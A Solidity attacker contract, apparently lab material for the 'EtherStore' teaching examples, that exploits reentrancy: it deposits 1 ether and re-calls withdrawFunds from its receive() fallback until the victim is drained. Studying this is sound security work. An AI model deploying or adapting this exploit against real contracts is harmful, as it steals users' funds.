// ATTACKER SMART CONTRACT FOR THE ETHERSTORE EXAMPLES

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;
import "hardhat/console.sol";

// Same interface for every EtherStore variant (etherstore.sol, etherstore_fixed.sol, ...)
interface IEtherStore {
    function depositFunds() external payable;
    function withdrawFunds(uint256 _weiToWithdraw) external;
}

contract EtherStoreAttacker {
    IEtherStore public immutable etherStore;

    // amount withdrawn per call (EtherStore's withdrawalLimit is 1 ether)
    uint256 public constant AMOUNT = 1 ether;

    constructor(address etherStoreAddress) {
        etherStore = IEtherStore(etherStoreAddress);
    }

    // deposit 1 ether, then start the first withdrawal
    function attack() external payable {
        require(msg.value >= AMOUNT, "Send at least 1 ether.");
        etherStore.depositFunds{value: AMOUNT}();
        etherStore.withdrawFunds(AMOUNT);
    }

    // re-enter withdrawFunds before the store updates balances / lastWithdrawTime
    receive() external payable {
        if (address(etherStore).balance >= AMOUNT) {
            console.log("reentering...");
            etherStore.withdrawFunds(AMOUNT);
        } else {
            console.log("victim account drained");
        }
    }

    // check the total balance of the Attacker contract
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
